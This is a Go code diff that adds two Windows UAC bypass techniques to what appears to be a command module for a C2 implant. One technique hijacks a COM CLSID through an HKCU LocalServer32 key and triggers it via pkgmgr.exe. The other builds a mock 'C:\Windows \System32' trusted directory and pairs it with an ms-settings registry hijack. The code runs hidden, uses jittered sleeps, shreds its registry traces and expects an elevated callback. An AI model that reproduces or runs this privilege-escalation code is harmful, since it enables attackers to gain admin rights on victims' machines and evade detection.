@@ -30,7 +30,7 @@ func (c *UACBypassCommand) Description() string {
 }
 
 type uacBypassArgs struct {
-	Technique string `json:"technique"` // fodhelper, computerdefaults, sdclt, eventvwr, silentcleanup, cmstp
+	Technique string `json:"technique"` // fodhelper, computerdefaults, sdclt, eventvwr, silentcleanup, cmstp, dismhost, wusa
 	Command   string `json:"command"`   // command to run elevated (default: self)
 }
 
@@ -73,8 +73,12 @@ func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
 		return uacBypassSilentCleanup(args.Command)
 	case "cmstp":
 		return uacBypassCmstp(args.Command)
+	case "dismhost":
+		return uacBypassDismhost(args.Command)
+	case "wusa":
+		return uacBypassWusa(args.Command)
 	default:
-		return errorf("Unknown technique: %s. Use: fodhelper, computerdefaults, sdclt, eventvwr, silentcleanup, cmstp", args.Technique)
+		return errorf("Unknown technique: %s. Use: fodhelper, computerdefaults, sdclt, eventvwr, silentcleanup, cmstp, dismhost, wusa", args.Technique)
 	}
 }
 
@@ -480,4 +484,229 @@ ShortSvcName="VPN"
 	output += "[*] Note: cmstp.exe may briefly display a UI element — this is expected."
 
 	return successResult(output)
+}
+
+// uacBypassDismhost exploits the DISM Package Manager COM object (CLSID
+// {3ad05575-8857-4850-9277-11b85bdb8e09}) by registering a LocalServer32
+// handler in HKCU. When pkgmgr.exe auto-elevates and CoCreates this CLSID,
+// COM resolution checks HKCU first and launches our command at high integrity.
+func uacBypassDismhost(command string) structs.CommandResult {
+	pkgmgrPath := resolveSystem32Binary("pkgmgr.exe")
+
+	var output string
+	output += "[*] UAC Bypass Technique: dismhost (COM CLSID hijack)\n"
+	output += fmt.Sprintf("[*] Trigger binary: %s\n", pkgmgrPath)
+	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)
+
+	// DISM Package Manager COM CLSID
+	clsid := `{3ad05575-8857-4850-9277-11b85bdb8e09}`
+	clsidKeyPath := `Software\Classes\CLSID\` + clsid
+	localServerPath := clsidKeyPath + `\LocalServer32`
+
+	// Step 1: Create HKCU CLSID registration with LocalServer32 pointing to our command
+	output += "[*] Step 1: Registering COM CLSID hijack in HKCU...\n"
+	key, _, err := registry.CreateKey(registry.CURRENT_USER, localServerPath, registry.SET_VALUE)
+	if err != nil {
+		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", localServerPath, err))
+	}
+	if err := key.SetStringValue("", command); err != nil {
+		key.Close()
+		return errorResult(output + fmt.Sprintf("Error setting LocalServer32 value: %v", err))
+	}
+	key.Close()
+	output += fmt.Sprintf("[+] COM CLSID registered: HKCU\\%s\n", localServerPath)
+
+	// Step 2: Launch pkgmgr.exe via ShellExecuteW to trigger auto-elevation + COM activation
+	output += "[*] Step 2: Launching pkgmgr.exe via ShellExecute...\n"
+	verbPtr, _ := windows.UTF16PtrFromString("open")
+	filePtr, _ := windows.UTF16PtrFromString(pkgmgrPath)
+	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
+	if err != nil {
+		cleanupDismhostKey(clsid)
+		return errorResult(output + fmt.Sprintf("Error launching pkgmgr.exe: %v", err))
+	}
+	output += "[+] Launched pkgmgr.exe via ShellExecute\n"
+
+	// Step 3: Wait briefly then clean up the CLSID registration
+	jitterSleep(2*time.Second, 4*time.Second)
+	output += "[*] Step 3: Cleaning up COM CLSID registration (shredding)...\n"
+	cleanupDismhostKey(clsid)
+	output += "[+] CLSID keys shredded and removed\n\n"
+
+	output += "[+] UAC bypass triggered successfully.\n"
+	output += "[*] If successful, a new elevated callback should appear shortly.\n"
+	output += "[*] The elevated process runs at high integrity (admin)."
+
+	return successResult(output)
+}
+
+// cleanupDismhostKey shreds values and removes the COM CLSID hijack registry keys
+func cleanupDismhostKey(clsid string) {
+	basePath := `Software\Classes\CLSID\` + clsid
+	shredRegistryKey(registry.CURRENT_USER, basePath+`\LocalServer32`)
+	_ = registry.DeleteKey(registry.CURRENT_USER, basePath+`\LocalServer32`)
+	_ = registry.DeleteKey(registry.CURRENT_USER, basePath)
+}
+
+// uacBypassWusa exploits the mock trusted directory technique (historically
+// associated with wusa.exe for file extraction). Creates a directory with a
+// trailing space ("C:\Windows \System32\") that passes Windows auto-elevation
+// path validation (GetLongPathNameW strips trailing spaces). An auto-elevating
+// binary copied to this mock directory runs elevated from user-writable space,
+// combined with the ms-settings registry hijack for command execution.
+//
+// Note: The original wusa.exe /extract technique (UACME method 2) was patched
+// in Windows 10 1607+. This implementation uses the mock trusted directory
+// evolution of that technique, which remains effective on current Windows versions.
+func uacBypassWusa(command string) structs.CommandResult {
+	var output string
+	output += "[*] UAC Bypass Technique: wusa (mock trusted directory)\n"
+	output += fmt.Sprintf("[*] Elevated command: %s\n\n", command)
+
+	windir := os.Getenv("WINDIR")
+	if windir == "" {
+		windir = os.Getenv("SystemRoot")
+	}
+	if windir == "" {
+		windir = `C:\Windows`
+	}
+
+	// Use \\?\ prefix to create directory with trailing space.
+	// Standard Windows API normalizes away trailing spaces; \\?\ bypasses this.
+	mockWindowsDir := `\\?\` + windir + ` `
+	mockSystem32Dir := mockWindowsDir + `\System32`
+
+	// The auto-elevating binary to copy into the mock directory.
+	// computerdefaults.exe is reliable and uses ms-settings protocol handler.
+	sourceBinary := resolveSystem32Binary("computerdefaults.exe")
+	destBinary := windir + ` \System32\computerdefaults.exe`
+
+	// Step 1: Create the mock trusted directory structure
+	output += "[*] Step 1: Creating mock trusted directory...\n"
+
+	// Create "C:\Windows \" (with trailing space) — user-writable
+	if err := createDirectoryW(mockWindowsDir); err != nil {
+		return errorResult(output + fmt.Sprintf("Error creating mock Windows dir: %v", err))
+	}
+	output += fmt.Sprintf("[+] Created: %s\n", windir+` `)
+
+	// Create "C:\Windows \System32\"
+	if err := createDirectoryW(mockSystem32Dir); err != nil {
+		cleanupWusaDirectory(mockWindowsDir, windir)
+		return errorResult(output + fmt.Sprintf("Error creating mock System32 dir: %v", err))
+	}
+	output += fmt.Sprintf("[+] Created: %s\\System32\n", windir+` `)
+
+	// Step 2: Copy the auto-elevating binary to the mock directory
+	output += "[*] Step 2: Copying auto-elevating binary to mock directory...\n"
+	if err := copyFileSimple(sourceBinary, destBinary); err != nil {
+		cleanupWusaDirectory(mockWindowsDir, windir)
+		return errorResult(output + fmt.Sprintf("Error copying %s: %v", filepath.Base(sourceBinary), err))
+	}
+	output += fmt.Sprintf("[+] Copied %s to mock System32\n", filepath.Base(sourceBinary))
+
+	// Step 3: Set up ms-settings registry hijack (same as fodhelper/computerdefaults technique)
+	output += "[*] Step 3: Setting ms-settings registry hijack...\n"
+	regKeyPath := `Software\Classes\ms-settings\Shell\Open\command`
+	key, _, err := registry.CreateKey(registry.CURRENT_USER, regKeyPath, registry.SET_VALUE)
+	if err != nil {
+		cleanupWusaDirectory(mockWindowsDir, windir)
+		return errorResult(output + fmt.Sprintf("Error creating HKCU\\%s: %v", regKeyPath, err))
+	}
+	if err := key.SetStringValue("", command); err != nil {
+		key.Close()
+		cleanupWusaDirectory(mockWindowsDir, windir)
+		return errorResult(output + fmt.Sprintf("Error setting command value: %v", err))
+	}
+	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
+		key.Close()
+		cleanupMsSettingsKey()
+		cleanupWusaDirectory(mockWindowsDir, windir)
+		return errorResult(output + fmt.Sprintf("Error setting DelegateExecute: %v", err))
+	}
+	key.Close()
+	output += fmt.Sprintf("[+] Registry set: HKCU\\%s\n", regKeyPath)
+
+	// Step 4: Launch the copied binary from the mock directory.
+	// Windows auto-elevation check resolves "C:\Windows \System32\computerdefaults.exe"
+	// via GetLongPathNameW which strips the trailing space, making the path appear as
+	// "C:\Windows\System32\computerdefaults.exe" — a trusted location. This passes the
+	// elevation check, so the binary auto-elevates. The elevated binary then reads the
+	// HKCU ms-settings handler and executes our command at high integrity.
+	output += "[*] Step 4: Launching from mock directory via ShellExecute...\n"
+	verbPtr, _ := windows.UTF16PtrFromString("open")
+	filePtr, _ := windows.UTF16PtrFromString(destBinary)
+	err = windows.ShellExecute(0, verbPtr, filePtr, nil, nil, 0 /* SW_HIDE */)
+	if err != nil {
+		cleanupMsSettingsKey()
+		cleanupWusaDirectory(mockWindowsDir, windir)
+		return errorResult(output + fmt.Sprintf("Error launching from mock directory: %v", err))
+	}
+	output += "[+] Launched computerdefaults.exe from mock trusted directory\n"
+
+	// Step 5: Wait briefly then clean up everything
+	jitterSleep(2*time.Second, 4*time.Second)
+	output += "[*] Step 5: Cleaning up...\n"
+	cleanupMsSettingsKey()
+	output += "[+] Registry keys shredded and removed\n"
+	cleanupWusaDirectory(mockWindowsDir, windir)
+	output += "[+] Mock trusted directory removed\n\n"
+
+	output += "[+] UAC bypass triggered successfully.\n"
+	output += "[*] If successful, a new elevated callback should appear shortly.\n"
+	output += "[*] The elevated process runs at high integrity (admin)."
+
+	return successResult(output)
+}
+
+// createDirectoryW creates a directory using the Windows API directly,
+// supporting \\?\ prefix paths for directory names with trailing spaces.
+func createDirectoryW(path string) error {
+	pathPtr, err := windows.UTF16PtrFromString(path)
+	if err != nil {
+		return err
+	}
+	return windows.CreateDirectory(pathPtr, nil)
+}
+
+// copyFileSimple copies a file from src to dst using binary read/write
+func copyFileSimple(src, dst string) error {
+	data, err := os.ReadFile(src)
+	if err != nil {
+		return err
+	}
+	return os.WriteFile(dst, data, 0755)
+}
+
+// cleanupWusaDirectory removes the mock trusted directory tree including all files.
+// Uses \\?\ prefix paths to handle directories with trailing spaces.
+func cleanupWusaDirectory(mockWindowsDir, windir string) {
+	// Remove the copied binary from System32 subdirectory
+	destBinary := `\\?\` + windir + ` \System32\computerdefaults.exe`
+	removeFileW(destBinary)
+
+	// Remove System32 subdirectory
+	system32Dir := mockWindowsDir + `\System32`
+	removeDirectoryW(system32Dir)
+
+	// Remove the mock Windows directory
+	removeDirectoryW(mockWindowsDir)
+}
+
+// removeFileW deletes a file using Windows API to support \\?\ prefix paths
+func removeFileW(path string) {
+	pathPtr, err := windows.UTF16PtrFromString(path)
+	if err != nil {
+		return
+	}
+	_ = windows.DeleteFile(pathPtr)
+}
+
+// removeDirectoryW deletes a directory using Windows API to support \\?\ prefix paths
+func removeDirectoryW(path string) {
+	pathPtr, err := windows.UTF16PtrFromString(path)
+	if err != nil {
+		return
+	}
+	_ = windows.RemoveDirectory(pathPtr)
 }
